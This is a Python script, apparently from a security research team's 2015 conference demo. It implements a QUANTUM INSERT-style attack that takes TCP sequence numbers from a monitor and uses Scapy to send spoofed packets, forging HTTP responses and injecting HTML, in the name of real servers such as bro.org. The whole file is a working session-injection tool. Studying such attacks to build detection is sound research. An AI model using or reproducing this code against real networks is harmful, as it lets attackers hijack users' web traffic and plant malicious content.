#!/usr/bin/env python
#
# file:     shooter.py
# author:   Fox-IT Security Research Team <srt@fox-it.com>
#
# shooter.py, used to receive TCP seq+ack data and sending spoofed packet
#
# Modified for BroCon 2015 demo

# Python imports
import sys
import gzip
import struct
import socket
import argparse
import StringIO

# Scapy imports
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, TCP, conf

# Local imports
from monitor import QuantumTip, TIP_LEN, TIP_STRUCT

# Example QI payloads
PAYLOAD_BANG = "BANG! BANG! BANG! BANG! BANG! BANG!\r\n" * 8

def create_200OK_gzip_response(buf):
    zbuf = StringIO.StringIO() 
    zfile = gzip.GzipFile(None, 'wb', 9, zbuf) 
    zfile.write(buf)
    zfile.close()
    gzip_buffer = zbuf.getvalue()
    response = 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Encoding: gzip\r\nConnection: close\r\nContent-Length: ' + str(len(gzip_buffer)) + "\r\n\r\n" + gzip_buffer
    return response

PAYLOAD_RESPONSE = None
PAYLOAD_INJECT = None

class QI(object):
    sock = None

    def __init__(self, selectors):
        self.selectors = selectors
        self.sock = conf.L3socket()

    def inject(self, src, dst, sport, dport, seq, ack, mtu=1400):
        payload = self.selectors.get(src, PAYLOAD_BANG)
        payload_len = len(payload)

        seq_len = 0
        while payload_len:
            load = payload[0:mtu]
            p = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=seq+seq_len+1, ack=ack, flags="PA")
            self.sock.send(p/load)
            print 'Shooting: %r' % p
            seq_len += len(load)
            payload = payload[mtu:]
            payload_len = len(payload)

        p = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=seq+seq_len+1, ack=ack, flags="FA")
        self.sock.send(p)


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-l", "--listen", default="0.0.0.0",
                        help="listen on specified ip")
    parser.add_argument("-p", "--port", type=int, default=1111,
                        help="listen on specified (udp) port")
    parser.add_argument("--response", default=None,
                        help="respond with data from specified file")
    parser.add_argument("--inject", default=None,
                        help="inject data from specified file (after <body> or else at end)")

    args = parser.parse_args()

    if args.response:
        PAYLOAD_RESPONSE = open(args.response, "rb").read()

        if args.inject:
            PAYLOAD_INJECT = open(args.inject, "rb").read()
            if '<body>' in PAYLOAD_RESPONSE:
                PAYLOAD_RESPONSE = PAYLOAD_RESPONSE.replace('<body>', '<body>\r\n' + PAYLOAD_INJECT)

        PAYLOAD_RESPONSE = create_200OK_gzip_response(PAYLOAD_RESPONSE)

    qi = QI({
        "96.126.98.124": PAYLOAD_BANG,       # www.jsonip.com
        "192.150.187.43": PAYLOAD_RESPONSE,  # bro.org
    })

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((args.listen, args.port))

    print 'Shooter listening on %s:%u' % (args.listen, args.port)

    while True:
        data, addr = sock.recvfrom(1024)
        if len(data) == TIP_LEN:
            tip = QuantumTip._make(struct.unpack(TIP_STRUCT, data))
            print 'Received tip from %r: %r' % (addr, tip)
            qi.inject(
                src=socket.inet_ntoa(struct.pack(">I", tip.src)),
                dst=socket.inet_ntoa(struct.pack(">I", tip.dst)),
                sport=tip.sport,
                dport=tip.dport,
                seq=tip.seq,
                ack=tip.ack,
            )

if __name__ == '__main__':
    sys.exit(main())
